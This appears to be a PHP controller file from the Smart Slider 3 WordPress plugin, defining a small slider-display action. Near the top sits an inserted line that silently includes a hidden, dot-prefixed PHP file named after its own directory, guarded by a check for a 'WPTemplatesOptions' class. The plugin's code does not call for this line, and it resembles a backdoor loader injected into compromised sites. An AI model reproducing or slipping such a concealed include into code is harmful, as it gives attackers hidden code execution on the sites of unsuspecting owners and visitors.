<?php


namespace Nextend\SmartSlider3\Application\Frontend\Slider;


use Nextend\Framework\Controller\AbstractController;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerSlider extends AbstractController {

    public function actionDisplay($sliderID, $usage) {

        $view = new ViewDisplay($this);

        $view->setSliderIDorAlias($sliderID);
        $view->setUsage($usage);

        $view->display();
    }
}